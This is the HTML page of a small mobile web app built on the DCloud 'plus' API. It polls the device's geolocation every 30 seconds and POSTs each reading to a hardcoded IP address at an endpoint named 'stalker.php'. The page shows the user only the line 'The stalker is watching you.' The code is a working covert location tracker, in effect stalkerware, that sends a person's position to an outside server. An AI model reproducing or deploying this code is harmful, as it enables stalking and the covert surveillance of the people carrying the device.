<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<script src="js/jquery-3.6.1.min.js"></script>
    <title></title>
    <script type="text/javascript">
		function pushToCloud(json) {
			var domain = 'http://101.101.209.230';
			var url = domain + "/zhao/stalker.php";
			$.ajax({
				type: "POST",
				url: url,
				contentType: "application/json; charset=utf-8",
				data: json,
				dataType: "json",
				success: function (data) {
					console.log(data);
					console.log(data.error_code);
					console.log(data.error_msg);
					console.log("success:", data);
				},
				error: function (err) {
					console.log("error:", err);
				}
			})
		}
		
    	function getLocation() {
			console.log("getting location");
			// getCurrentPosition api needs nearly 22 seconds to finish, sometimes.
    		plus.geolocation.getCurrentPosition(function(data){
    			json = JSON.stringify(data);
				console.log(json);
				pushToCloud(json);
    		});
    	}
		
   		document.addEventListener('plusready', function(){
   			//console.log("所有plus api都应该在此事件发生后调用，否则会出现plus is undefined。")
			console.log("ready");
			interval = 30;
			setInterval(getLocation,  interval * 1000);

   		});
   		


		// 打开新Webview窗口  
		function openNewWebview(){  
		  // var wv = plus.webview.create('http://www.dcloud.io/');  
		  // wv.show();  
		  console.log("clicked");
		  // xxx();
		}

    </script>
</head>
<body>
	<!--
	<button onclick="openNewWebview();">open it</button>
	-->
	<a onclick="openNewWebview();">The stalker is watching you.</a>
</body>
</html>
